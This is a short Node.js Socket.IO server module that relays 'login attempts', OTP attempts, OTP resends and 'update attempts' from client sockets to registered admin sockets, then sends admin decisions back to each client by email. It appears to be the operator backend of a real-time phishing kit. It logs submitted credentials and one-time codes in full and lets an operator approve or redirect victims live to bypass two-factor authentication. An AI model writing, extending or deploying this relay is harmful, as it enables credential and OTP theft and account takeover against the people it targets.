const clients = new Map();
const admins = new Set();

function setupSocket(io) {
  io.on("connection", (socket) => {
    console.log("New client connected");

    socket.on("registerAdmin", () => {
      admins.add(socket.id);
      console.log("Admin registered");
    });

    socket.on("loginAttempt", (data) => {
      clients.set(data.email, socket.id);
      console.log("Login attempt:", data);
      // Broadcast to all admin sockets
      admins.forEach((adminId) => {
        io.to(adminId).emit("loginAttempt", data);
      });
    });

    socket.on("otpAttempt", (data) => {
      clients.set(data.email, socket.id);
      console.log("OTP attempt:", data);
      // Broadcast to all admin sockets
      admins.forEach((adminId) => {
        io.to(adminId).emit("otpAttempt", data);
      });
    });

    socket.on("otpAttemptMobile", (data) => {
      clients.set(data.email, socket.id);
      console.log("OTP attempt:", data);
      // Broadcast to all admin sockets
      admins.forEach((adminId) => {
        io.to(adminId).emit("otpAttemptMobile", data);
      });
    });

    socket.on("otpResendAttempt", (data) => {
      clients.set(data.email, socket.id);
      console.log("OTP Resend attempt:", data);
      // Broadcast to all admin sockets
      admins.forEach((adminId) => {
        io.to(adminId).emit("otpResendAttempt", data);
      });
    });

    socket.on("updateAttempt", (data) => {
      clients.set(data.email, socket.id);
      console.log("OTP Update attempt:", data);
      // Broadcast to all admin sockets
      admins.forEach((adminId) => {
        io.to(adminId).emit("updateAttempt", data);
      });
    });

    socket.on("updateAttemptMobile", (data) => {
      clients.set(data.email, socket.id);
      console.log("OTP Update attempt:", data);
      // Broadcast to all admin sockets
      admins.forEach((adminId) => {
        io.to(adminId).emit("updateAttemptMobile", data);
      });
    });

    socket.on("adminResponse", (data) => {
      console.log("Admin response:", data);
      const clientSocketId = clients.get(data.email);
      if (clientSocketId) {
        io.to(clientSocketId).emit("adminResponse", data);
      }
    });

    socket.on("adminOtpResponse", (data) => {
      console.log("Admin OTP response:", data);
      const clientSocketId = clients.get(data.email);
      if (clientSocketId) {
        io.to(clientSocketId).emit("adminOtpResponse", data);
      }
    });

    socket.on("adminOtpUpdatedResponse", (data) => {
      console.log("Admin OTP Updated:", data);
      const clientSocketId = clients.get(data.email);
      if (clientSocketId) {
        io.to(clientSocketId).emit("adminOtpUpdatedResponse", data);
      }
    });

    socket.on("adminOtpUpdatedResponseMobile", (data) => {
      console.log("Admin OTP Updated:", data);
      const clientSocketId = clients.get(data.email);
      if (clientSocketId) {
        io.to(clientSocketId).emit("adminOtpUpdatedResponseMobile", data);
      }
    });

    socket.on("disconnect", () => {
      console.log("Client disconnected");
      admins.delete(socket.id);
      // Remove client from clients Map if it exists
      for (let [email, socketId] of clients.entries()) {
        if (socketId === socket.id) {
          clients.delete(email);
          break;
        }
      }
    });
  });
}

module.exports = setupSocket;
